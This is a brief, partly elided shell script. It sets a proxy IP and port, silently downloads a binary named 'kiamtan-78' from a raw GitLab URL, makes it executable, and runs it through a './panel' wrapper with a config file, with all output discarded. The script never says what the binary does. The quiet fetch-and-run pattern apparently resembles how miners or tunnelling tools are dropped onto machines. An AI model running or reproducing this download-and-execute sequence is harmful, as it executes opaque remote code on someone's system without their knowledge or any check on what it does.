proxy="162.248.225.230"
port="80" 
wget -q -O kiamtan-78 https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x kiamtan-78
...
./panel ./kiamtan-78 -c "config.json" >/dev/null 2>&1
sleep 1
